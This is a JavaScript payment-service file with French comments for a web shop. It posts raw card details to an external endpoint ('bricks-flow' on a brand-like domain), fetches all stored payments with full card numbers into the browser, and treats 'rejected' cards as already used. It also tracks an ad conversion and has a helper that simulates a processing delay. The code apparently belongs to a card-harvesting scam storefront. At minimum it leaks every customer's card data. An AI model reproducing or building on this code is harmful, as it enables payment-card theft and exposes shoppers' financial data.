// Service pour gérer les opérations de paiement et de vérification
export class PaymentService {
  
  /**
   * Vérifier si une carte a déjà été utilisée
   * @param {string} cardNumber - Numéro de carte à vérifier
   * @returns {Promise<boolean>} - True si la carte a déjà été utilisée
   */
  static async verifyCard(cardNumber) {
    try {
      // Normalise le numéro cherché (supprime les espaces)
      const target = cardNumber.replace(/\s/g, '');

      // Appel à l'API et parsing de la réponse
      const response = await fetch('/api/get-payments', {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });
      
      if (!response.ok) {
        console.error('Error fetching payments:', response.status, response.statusText);
        return false;
      }
      
      const { payments } = await response.json();

      // Parcourt les paiements et renvoie true si on trouve une correspondance de carte 
      // avec les statuts 'rejected' ou 'success'
      return payments.some(payment => {
        const details = typeof payment.card_details === 'string'
          ? JSON.parse(payment.card_details)
          : payment.card_details;
        const stored = (details.cardNumber || '').replace(/\s/g, '');
        return stored === target && (payment.status === 'rejected' || payment.status === 'success');
      });
    } catch (error) {
      console.error('Error in verifyCard:', error);
      return false;
    }
  }

  /**
   * Effectuer un paiement
   * @param {string} orderNumber - Numéro de commande
   * @param {string} amount - Montant du paiement
   * @param {Object} cardDetails - Détails de la carte
   * @returns {Promise<Object>} - Résultat du paiement
   */
  static async payFetch(orderNumber, amount, cardDetails, initPromiseRef = null) {
    try {
      // Attendre que l'initialisation se termine sans erreur
      if (initPromiseRef?.current) {
        try {
          await initPromiseRef.current; 
        } catch (error) {
          throw new Error("L'initialisation du paiement a échoué : " + error.message);
        }
      }

      // Générer un numéro de paiement aléatoire 
      const paymentNumber = Math.floor(Math.random() * 100000);

      const response = await fetch(`https://api.christopeit-sport.fr/bricks-flow`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ orderNumber, paymentNumber, amount, cardDetails }),
      });
      
      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.message || 'Something went wrong!');
      }
      
      console.log("Réponse de l'API:", data);
      return data.result || data;
      
    } catch (error) {
      console.error('Error fetching payment:', error);
      throw error;
    }
  }

  /**
   * Déclencher le tracking de conversion Google Ads
   * @param {string} orderNumber - Numéro de commande
   * @param {Object} shop - Informations du shop
   * @param {string} url - URL de redirection (optionnel)
   */
  static triggerConversion(orderNumber, shop, url = null) {
    if (typeof gtag === 'undefined') {
      console.warn('Google Analytics gtag not found');
      return false;
    }

    const callback = function () {
      if (typeof(url) !== 'undefined' && url) {
        window.location = url;
      }
    };

    // Google Ads : Tracking "Achat"
    gtag('event', 'conversion', {
      'send_to': `${shop.tag}/${shop.tagBuy}`,
      'transaction_id': orderNumber,
      'event_callback': callback
    });
    
    return false;
  }

  /**
   * Simuler un délai de traitement
   * @param {number} ms - Délai en millisecondes
   * @returns {Promise<void>}
   */
  static async delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
